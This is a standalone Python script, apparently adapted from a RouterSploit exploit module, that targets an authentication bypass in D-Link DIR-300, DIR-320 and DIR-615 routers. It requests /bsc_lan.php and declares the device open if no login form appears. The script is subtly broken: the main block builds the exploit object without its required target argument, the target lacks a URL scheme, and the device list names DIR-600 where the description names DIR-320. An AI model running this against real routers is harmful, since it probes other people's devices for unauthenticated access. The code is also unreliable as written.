target = ""
# rsf exploit module
# description: Module exploits authentication bypass vulnerability in D-Link DIR-300, DIR-320, DIR-615 devices.

import requests

class Exploit:
    __info__ = {
        "name": "D-Link DIR-300 & DIR-320 & DIR-615 Auth Bypass",
        "description": "Module exploits authentication bypass vulnerability in D-Link DIR-300, DIR-320, DIR-615 devices.",
        "authors": (
            "Craig Heffner",  # vulnerability discovery
            "Karol Celin",  # vulnerability discovery
        ),
        "references": (
            "http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf",
        ),
        "devices": (
            "D-Link DIR-300",
            "D-Link DIR-600",
            "D-Link DIR-615 revD",
        )
    }

    def __init__(self, target):
        self.target = target
        self.port = 80

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("No authentication needed for actions on target.")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def check(self):
        response = requests.get(f"{self.target}/bsc_lan.php")
        if '<form name="frm" id="frm" method="post" action="login.php">' not in response.text:
            return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
